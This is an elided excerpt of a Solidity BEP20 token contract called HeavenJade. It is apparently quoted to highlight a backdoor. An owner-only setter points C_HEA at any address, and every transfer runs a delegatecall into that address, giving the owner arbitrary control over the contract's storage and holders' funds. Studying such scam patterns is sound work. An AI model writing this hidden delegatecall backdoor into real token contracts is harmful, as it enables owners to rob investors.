...
contract HeavenJade is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'HeavenJade';
  string private constant _symbol = 'HEA';
  ...
  */
  ...
  function claimDividendHEA(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_HEA.delegatecall(
  ...
  function SetBonusHEA(address c) public onlyOwner {
    C_HEA = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendHEA(sender, recipient, amount);   
